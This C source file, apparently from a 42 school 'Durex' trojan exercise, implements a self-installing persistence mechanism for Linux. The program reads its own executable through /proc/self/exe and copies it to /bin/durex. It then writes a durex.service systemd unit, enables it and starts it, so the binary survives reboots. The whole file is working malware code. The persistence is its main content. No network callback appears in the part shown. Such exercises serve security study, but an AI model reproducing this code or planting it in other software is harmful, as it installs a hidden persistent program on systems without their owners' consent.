/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex_bin.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/02/08 15:10:04 by user42            #+#    #+#             */
/*   Updated: 2022/02/15 11:12:14 by user42           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

void	self_replicate_to_target(void)
{
	int				path_len, bin_fd, out_fd;
	char			bin_path[256];
	struct stat		bin_st;
	void			*bin_map;

	path_len = readlink("/proc/self/exe", bin_path, 256);
	bin_path[path_len] = '\0';
	
	if ((bin_fd = open(bin_path, O_RDONLY)) < 0)
	{
		printf("[X] Durex binary can't open itself for self-replication.\n");
		exit(1);
	}
	if (fstat(bin_fd, &bin_st) != 0)
	{
		printf("[X] Durex binary can't fstat itself.\n");
		exit(1);
	}
	
	bin_map = mmap(0, bin_st.st_size, PROT_READ, MAP_PRIVATE, bin_fd, 0);
	if ((out_fd = open("/bin/durex", O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU)) < 0)				// Hardcoded target binary at the moment
	{
		if (errno != ETXTBSY)
		{
			printf("[X] Durex binary can't open destination file for self-replicating.\n");
			exit(1);
		}
	}
	write(out_fd, bin_map, bin_st.st_size);

	close(bin_fd);
	close(out_fd);
	munmap(bin_map, bin_st.st_size);
}

void	init_durex_bin(t_durex_bin *durex_bin)
{
	durex_bin->systemd_folder = malloc(CMD_OUT_MAX * sizeof(char));
	if (!durex_bin->systemd_folder)
		exit(1);
	durex_bin->config_path = malloc((CMD_OUT_MAX + strlen("durex.service") + 1) * sizeof(char));
	if (!durex_bin->config_path)
		exit(1);

}

void	clean_durex_bin(t_durex_bin *durex_bin)
{
	free(durex_bin->systemd_folder);
	free(durex_bin->config_path);
}

void	get_systemd_folder(t_durex_bin *durex_bin)
{
	char **const args = malloc(4 * sizeof(char *));
	args[0] = "pkg-config";
	args[1] = "--variable=systemdsystemunitdir";
	args[2] = "systemd";
	args[3] = NULL;
	if (exec_safe_w_output("pkg-config", args, durex_bin->systemd_folder) != 0)
		strcpy(durex_bin->systemd_folder, "/etc/systemd/system");
	free(args);
}

void	create_config_file(t_durex_bin *durex_bin)
{
	int		config_fd;
	char	payload[] = "[Unit]\nDescription=Durex Service\nWants=\n\n[Service]\nExecStart=/usr/bin/stdbuf -oL /bin/durex\n\n[Install]\nWantedBy=multi-user.target\n";

	strcpy(durex_bin->config_path, durex_bin->systemd_folder);
	strcat(durex_bin->config_path, "/durex.service");

	if ((config_fd = open(durex_bin->config_path, O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU)) == -1)
	{
		printf("[X] Error while opening configuration file %s. Check systemd installation.\n", durex_bin->config_path);
		exit(1);
	}
	size_t nbytes = write(config_fd, payload, strlen(payload));
	if (nbytes != strlen(payload))
	{
		printf("[X] Error while writing to configuration file.\n");
		exit(1);
	}
	close(config_fd);
}

void	enable_durex_daemon(void)
{
	char **const args = malloc(4 * sizeof(char *));
	args[0] = "systemctl";
	args[1] = "enable";
	args[2] = "durex.service";
	args[3] = NULL;
	if (exec_safe("systemctl", args) != 0)
	{
		printf("[X] Couldn't enable durex daemon. Check systemctl command.\n");
		exit(1);
	}
	free(args);
}

void	launch_durex_daemon(void)
{
	char **const args = malloc(4 * sizeof(char *));
	args[0] = "systemctl";
	args[1] = "start";
	args[2] = "durex.service";
	args[3] = NULL;
	if (exec_safe("systemctl", args) != 0)
	{
		printf("[X] Couldn't start durex daemon. Check systemctl command.\n");
		exit(1);
	}
	free(args);
}

void	setup_daemon(t_durex_bin *durex_bin)
{
	clear_env();
	get_systemd_folder(durex_bin);
	create_config_file(durex_bin);
	enable_durex_daemon();
	launch_durex_daemon();
	return ;
}

void	durex_bin(void)
{
	t_durex_bin		durex_bin;

	init_durex_bin(&durex_bin);
	self_replicate_to_target();
	setup_daemon(&durex_bin);
	printf("qroland\n");
	clean_durex_bin(&durex_bin);
}
